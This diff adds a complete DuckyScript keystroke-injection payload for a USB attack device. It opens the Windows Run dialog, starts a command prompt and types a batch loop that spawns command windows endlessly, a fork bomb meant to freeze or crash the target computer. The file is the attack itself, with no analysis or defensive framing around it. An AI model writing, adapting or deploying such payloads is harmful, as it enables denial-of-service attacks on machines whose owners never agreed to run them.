@@ -1,0 +1,17 @@
+REM Created by Petalon :) TEST TRY
+
+DELAY 500
+
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING @echo off 
+ENTER
+STRING :crash
+ENTER
+STRING start
+ENTER
+STRING goto crash
+ENTER
